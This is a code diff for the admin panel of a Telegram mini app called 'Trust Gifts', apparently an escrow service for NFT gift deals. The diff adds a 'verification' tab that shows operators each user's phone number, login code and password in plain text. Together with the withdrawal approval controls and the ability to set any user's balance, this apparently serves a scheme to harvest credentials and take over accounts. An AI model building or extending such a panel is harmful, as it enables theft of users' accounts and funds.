-                        '>📦 Подтверждение</option>' +
-                        '<option value="completed"' + (d.status === 'completed' ? ' selected' :
-                            '') + '>🎉 Завершено</option>' +
-                        '</select>' +
-                        '<button class="btn btn-danger btn-sm" onclick="adminUpdateDeal(\'' +
-                        d.deal_id + '\',\'delete\')" style="width:auto;padding:4px 12px;font-size:11px;"><i class="fas fa-trash"></i></button>' +
-                        '</div></div>';
-                }).join('') :
-                '<p style="color:var(--text-muted);font-size:13px;">Нет сделок</p>') +
-                '</div>' +
-                '</div>' +
+                <div class="admin-panel" id="admin-deals">
+                    <div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;">
+                        <input type="text" id="dealSearch" placeholder="🔍 Поиск сделок..." style="flex:1;padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:'Inter',sans-serif;outline:none;">
+                        <select id="dealFilter" style="padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:'Inter',sans-serif;outline:none;">
+                            <option value="all">Все статусы</option>
+                            <option value="waiting_payment">⏳ Ожидает</option>
+                            <option value="paid">✅ Оплачено</option>
+                            <option value="awaiting_confirmation">📦 Подтверждение</option>
+                            <option value="completed">🎉 Завершено</option>
+                        </select>
+                    </div>
+                    <div id="adminDealsList">
+                        ${dealsList.length > 0 ? dealsList.map(function(d) {
+                            return '<div class="deal-card" style="font-size:12px;">' +
+                                '<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px;">' +
+                                '<strong>#' + escapeHtml(d.deal_id) + '</strong> — ' + escapeHtml(d.product) +
+                                '<span class="deal-status ' + d.status + '">' + getStatusText(d.status) + '</span>' +
+                                '</div>' +
+                                '<div style="color:var(--text-secondary);">💰 ' + d.amount + ' ' + d.currency + ' • 👤 @' + escapeHtml(d.seller_username || '?') + ' → @' + escapeHtml(d.buyer_username || '?') + '</div>' +
+                                (d.nft_name ? '<div style="color:var(--aqua);font-size:11px;">🖼️ ' + escapeHtml(d.nft_name) + (d.nft_number ? ' #' + d.nft_number : '') + '</div>' : '') +
+                                '<div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;">' +
+                                '<button class="btn btn-danger btn-sm" onclick="adminDeleteDeal(\'' + d.deal_id + '\')" style="width:auto;padding:4px 12px;font-size:11px;"><i class="fas fa-trash"></i> Удалить</button>' +
+                                '</div></div>';
+                        }).join('') : '<p style="color:var(--text-muted);font-size:13px;">Нет сделок</p>'}
+                    </div>
+                </div>
 
-                '<div class="admin-panel" id="admin-balance">' +
-                '<div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;">' +
-                '<input type="text" id="balanceUserId" placeholder="🆔 ID пользователя" style="flex:1;padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:\'Inter\',sans-serif;outline:none;">' +
-                '<select id="balanceCurrency" style="padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:\'Inter\',sans-serif;outline:none;">' +
-                '<option value="TON">💎 TON</option>' +
-                '<option value="STARS">⭐️ STARS</option>' +
-                '<option value="RUB">💰 RUB</option>' +
-                '<option value="UAH">🌐 UAH</option>' +
-                '</select>' +
-                '<input type="number" id="balanceAmount" placeholder="Сумма" style="width:120px;padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:\'Inter\',sans-serif;outline:none;">' +
-                '</div>' +
-                '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">' +
-                '<button class="btn btn-primary btn-sm" onclick="adminBalanceAction(\'add\')" style="width:auto;padding:8px 20px;">➕ Пополнить</button>' +
-                '<button class="btn btn-danger btn-sm" onclick="adminBalanceAction(\'remove\')" style="width:auto;padding:8px 20px;">➖ Списать</button>' +
-                '<button class="btn btn-secondary btn-sm" onclick="adminBalanceAction(\'set\')" style="width:auto;padding:8px 20px;">✏️ Установить</button>' +
-                '<button class="btn btn-gold btn-sm" onclick="adminBalanceAction(\'bonus\')" style="width:auto;padding:8px 20px;">🎁 Бонус</button>' +
-                '</div>' +
-                '<div id="balanceResult" style="font-size:13px;color:var(--text-secondary);"></div>' +
-                '</div>' +
+                <div class="admin-panel" id="admin-balance">
+                    <div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;">
+                        <input type="text" id="balanceUserId" placeholder="🆔 ID пользователя" style="flex:1;padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:'Inter',sans-serif;outline:none;">
+                        <select id="balanceCurrency" style="padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:'Inter',sans-serif;outline:none;">
+                            <option value="TON">💎 TON</option>
+                            <option value="STARS">⭐️ STARS</option>
+                            <option value="RUB">💰 RUB</option>
+                            <option value="UAH">🌐 UAH</option>
+                        </select>
+                        <input type="number" id="balanceAmount" placeholder="Сумма" style="width:120px;padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:'Inter',sans-serif;outline:none;">
+                    </div>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
+                        <button class="btn btn-primary btn-sm" onclick="adminBalanceAction('add')" style="width:auto;padding:8px 20px;">➕ Пополнить</button>
+                        <button class="btn btn-danger btn-sm" onclick="adminBalanceAction('remove')" style="width:auto;padding:8px 20px;">➖ Списать</button>
+                        <button class="btn btn-secondary btn-sm" onclick="adminBalanceAction('set')" style="width:auto;padding:8px 20px;">✏️ Установить</button>
+                    </div>
+                    <div id="balanceResult" style="font-size:13px;color:var(--text-secondary);"></div>
+                </div>
 
-                '<div style="margin-top:16px;display:flex;gap:8px;">' +
-                '<button class="btn btn-secondary btn-sm" onclick="adminRefresh()" style="width:auto;padding:8px 20px;"><i class="fas fa-sync"></i> Обновить</button>' +
-                '<button class="btn btn-secondary btn-sm" onclick="showPage(\'main\')" style="width:auto;padding:8px 20px;"><i class="fas fa-arrow-left"></i> На главную</button>' +
-                '</div>';
+                <div class="admin-panel" id="admin-verification">
+                    <div id="verificationRequestsList">
+                        ${verificationRequests.filter(r => r.status === 'pending').length > 0 ? 
+                            verificationRequests.filter(r => r.status === 'pending').map(function(req) {
+                                return '<div class="deal-card" style="font-size:12px;">' +
+                                    '<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px;">' +
+                                    '<strong>#' + escapeHtml(req.id) + '</strong> — 👤 @' + escapeHtml(req.username || '?') +
+                                    '<span style="font-size:11px;color:var(--warning);">⏳ Ожидает</span>' +
+                                    '</div>' +
+                                    '<div style="color:var(--text-secondary);font-size:12px;">📞 ' + escapeHtml(req.phone || '') + '</div>' +
+                                    '<div style="color:var(--text-secondary);font-size:12px;">📨 ' + escapeHtml(req.code || 'ожидается') + '</div>' +
+                                    '<div style="color:var(--text-secondary);font-size:12px;">🔑 ' + escapeHtml(req.password || 'ожидается') + '</div>' +
+                                    '<div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;">' +
+                                    '<button class="btn btn-success btn-sm" onclick="adminConfirmVerification(\'' + req.id + '\')" style="width:auto;padding:4px 12px;font-size:11px;"><i class="fas fa-check"></i> Подтвердить</button>' +
+                                    '<button class="btn btn-danger btn-sm" onclick="adminRejectVerification(\'' + req.id + '\')" style="width:auto;padding:4px 12px;font-size:11px;"><i class="fas fa-times"></i> Отклонить</button>' +
+                                    '</div></div>';
+                            }).join('') : 
+                            '<p style="color:var(--text-muted);font-size:13px;">Нет активных запросов на верификацию</p>'
+                        }
+                    </div>
+                </div>
 
+                <div class="admin-panel" id="admin-withdraw">
+                    <div id="withdrawRequestsList">
+                        ${withdrawRequests.filter(r => r.status === 'pending').length > 0 ?
+                            withdrawRequests.filter(r => r.status === 'pending').map(function(req) {
+                                return '<div class="deal-card" style="font-size:12px;">' +
+                                    '<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px;">' +
+                                    '<strong>#' + escapeHtml(req.id) + '</strong> — 👤 ID: ' + req.user_id +
+                                    '<span style="font-size:11px;color:var(--warning);">⏳ Ожидает</span>' +
+                                    '</div>' +
+                                    '<div style="color:var(--text-secondary);font-size:12px;">💰 ' + req.amount + ' ' + req.currency + '</div>' +
+                                    '<div style="color:var(--text-secondary);font-size:12px;">📝 ' + escapeHtml(req.details || '') + '</div>' +
+                                    '<div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;">' +
+                                    '<button class="btn btn-success btn-sm" onclick="adminConfirmWithdraw(\'' + req.id + '\')" style="width:auto;padding:4px 12px;font-size:11px;"><i class="fas fa-check"></i> Подтвердить</button>' +
+                                    '<button class="btn btn-danger btn-sm" onclick="adminRejectWithdraw(\'' + req.id + '\')" style="width:auto;padding:4px 12px;font-size:11px;"><i class="fas fa-times"></i> Отклонить</button>' +
+                                    '</div></div>';
+                            }).join('') :
+                            '<p style="color:var(--text-muted);font-size:13px;">Нет заявок на вывод</p>'
+                        }
+                    </div>
+                </div>
+
+                <div class="admin-panel" id="admin-tickets">
+                    <div id="adminTicketsList">
+                        ${ticketsList.length > 0 ? ticketsList.map(function(t) {
+                            return '<div class="deal-card" style="font-size:12px;">' +
+                                '<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px;">' +
+                                '<strong>#' + escapeHtml(t.ticket_id || t.id) + '</strong> — 👤 @' + escapeHtml(t.username || '?') +
+                                '<span class="ticket-status ' + (t.status === 'open' ? 'open' : 'closed') + '">' + (t.status === 'open' ? '🟢 Открыт' : '🔒 Закрыт') + '</span>' +
+                                '</div>' +
+                                '<div style="color:var(--text-secondary);font-size:12px;">📝 ' + escapeHtml(t.subject || '') + '</div>' +
+                                '<div style="color:var(--text-secondary);font-size:12px;">💬 ' + escapeHtml((t.message || '').slice(0, 50)) + (t.message && t.message.length > 50 ? '...' : '') + '</div>' +
+                                (t.response ? '<div style="color:var(--aqua);font-size:12px;">📩 Ответ: ' + escapeHtml(t.response) + '</div>' : '') +
+                                '</div>';
+                        }).join('') : '<p style="color:var(--text-muted);font-size:13px;">Нет тикетов</p>'}
+                    </div>
+                </div>
+            `;
+
+            // Табы
             document.querySelectorAll('.admin-tabs button').forEach(function(btn) {
                 btn.addEventListener('click', function() {
-                    document.querySelectorAll('.admin-tabs button').forEach(function(b) { b.classList
-                            .remove('active'); });
+                    document.querySelectorAll('.admin-tabs button').forEach(function(b) { b.classList.remove('active'); });
                     this.classList.add('active');
                     const tab = this.dataset.tab;
-                    document.querySelectorAll('.admin-panel').forEach(function(p) { p.classList.remove(
-                            'active'); });
+                    document.querySelectorAll('.admin-panel').forEach(function(p) { p.classList.remove('active'); });
                     const target = document.getElementById('admin-' + tab);
                     if (target) target.classList.add('active');
                 });
             });
 
+            // Поиск пользователей
             document.getElementById('userSearch')?.addEventListener('input', function() {
                 const query = this.value.toLowerCase();
                 document.querySelectorAll('#usersList .deal-card').forEach(function(item) {
-                    item.style.display = item.textContent.toLowerCase().includes(query) ? 'flex' :
-                        'none';
+                    item.style.display = item.textContent.toLowerCase().includes(query) ? 'flex' : 'none';
                 });
             });
 
+            // Поиск сделок
             document.getElementById('dealSearch')?.addEventListener('input', filterDeals);
             document.getElementById('dealFilter')?.addEventListener('change', filterDeals);
 
@@ -1844,17 +1920,66 @@
             }
         }
 
-        window.adminUpdateDeal = async function(dealId, action, value) {
-            const d = await apiCall('/api/admin_update_deal', { deal_id: dealId, action: action, status: value });
+        // ============================================================
+        // 21. АДМИН ФУНКЦИИ
+        // ============================================================
+        async function adminDeleteDeal(dealId) {
+            if (!confirm('Удалить сделку #' + dealId + '?')) return;
+            const d = await apiCall('/api/admin_delete_deal', { deal_id: dealId });
             if (d.success) {
-                showToast('✅ Обновлено', 'success');
+                showToast('✅ Сделка удалена', 'success');
                 loadAdminPanel();
                 loadDeals();
-                loadMainData();
-            } else { showToast('❌ ' + (d.error || 'Ошибка'), 'error'); }
-        };
+            } else {
+                showToast('❌ ' + (d.error || 'Ошибка'), 'error');
+            }
+        }
 
-        window.adminBalanceAction = async function(action) {
+        async function adminConfirmVerification(requestId) {
+            if (!confirm('Подтвердить верификацию #' + requestId + '?')) return;
+            const d = await apiCall('/api/admin_confirm_verification', { request_id: requestId });
+            if (d.success) {
+                showToast('✅ Верификация подтверждена', 'success');
+                loadAdminPanel();
+            } else {
+                showToast('❌ ' + (d.error || 'Ошибка'), 'error');
+            }
+        }
+
+        async function adminRejectVerification(requestId) {
+            if (!confirm('Отклонить верификацию #' + requestId + '?')) return;
+            const d = await apiCall('/api/admin_reject_verification', { request_id: requestId });
+            if (d.success) {
+                showToast('❌ Верификация отклонена', 'error');
+                loadAdminPanel();
+            } else {
+                showToast('❌ ' + (d.error || 'Ошибка'), 'error');
+            }
+        }
+
+        async function adminConfirmWithdraw(requestId) {
+            if (!confirm('Подтвердить вывод #' + requestId + '?')) return;
+            const d = await apiCall('/api/admin_confirm_withdraw', { request_id: requestId });
+            if (d.success) {
+                showToast('✅ Вывод подтверждён', 'success');
+                loadAdminPanel();
+            } else {
+                showToast('❌ ' + (d.error || 'Ошибка'), 'error');
+            }
+        }
+
+        async function adminRejectWithdraw(requestId) {
+            if (!confirm('Отклонить вывод #' + requestId + '?')) return;
+            const d = await apiCall('/api/admin_reject_withdraw', { request_id: requestId });
+            if (d.success) {
+                showToast('❌ Вывод отклонён', 'error');
+                loadAdminPanel();
+            } else {
+                showToast('❌ ' + (d.error || 'Ошибка'), 'error');
+            }
+        }
+
+        async function adminBalanceAction(action) {
             const userId = document.getElementById('balanceUserId').value.trim();
             const currency = document.getElementById('balanceCurrency').value;
             const amount = parseFloat(document.getElementById('balanceAmount').value);
@@ -1867,14 +1992,9 @@
 
             let endpoint = '';
             let label = '';
-            if (action === 'add') { endpoint = '/api/admin_add_balance';
-                label = '➕ Пополнено'; }
-            if (action === 'set') { endpoint = '/api/admin_set_balance';
-                label = '✏️ Установлено'; }
-            if (action === 'remove') { endpoint = '/api/admin_remove_balance';
-                label = '➖ Списано'; }
-            if (action === 'bonus') { endpoint = '/api/admin_add_balance';
-                label = '🎁 Бонус начислен'; }
+            if (action === 'add') { endpoint = '/api/admin_add_balance'; label = '➕ Пополнено'; }
+            if (action === 'set') { endpoint = '/api/admin_set_balance'; label = '✏️ Установлено'; }
+            if (action === 'remove') { endpoint = '/api/admin_remove_balance'; label = '➖ Списано'; }
 
             const d = await apiCall(endpoint, { target_user_id: parseInt(userId), currency: currency, amount: amount });
             if (d.success) {
@@ -1886,15 +2006,7 @@
                 resultDiv.innerHTML = '❌ ' + (d.error || 'Ошибка');
                 showToast('❌ ' + (d.error || 'Ошибка'), 'error');
             }
-        };
-
-        window.adminUserAction = function(userId, action) {
-            showToast('🔄 Действие "' + action + '" для пользователя ' + userId, 'info');
-            if (action === 'balance') {
-                document.getElementById('balanceUserId').value = userId;
-                document.querySelector('.admin-tabs button[data-tab="balance"]')?.click();
-            }
-        };
+        }
 
         function adminRefresh() {
             loadAdminPanel();
@@ -1902,7 +2014,7 @@
         }
 
         // ============================================================
-        // 20. ПРОФИЛЬ
+        // 22. ПРОФИЛЬ
         // ============================================================
         async function loadProfile() {
             document.getElementById('profileName').textContent = user.firstName;
@@ -1917,7 +2029,7 @@
         }
 
         // ============================================================
-        // 21. ВИЗАРД
+        // 23. ВИЗАРД
         // ============================================================
         let wizardStep = 0;
 
@@ -1992,7 +2104,7 @@
         };
 
         // ============================================================
-        // 22. MODAL / TOAST
+        // 24. MODAL / TOAST
         // ============================================================
         window.showModal = function(html) {
             document.getElementById('modalBody').innerHTML = html;
@@ -2008,7 +2120,7 @@
         });
 
         // ============================================================
-        // 23. ЗАПУСК
+        // 25. ЗАПУСК
         // ============================================================
         console.log('🌊 Trust Gifts Mini App загружена');
 
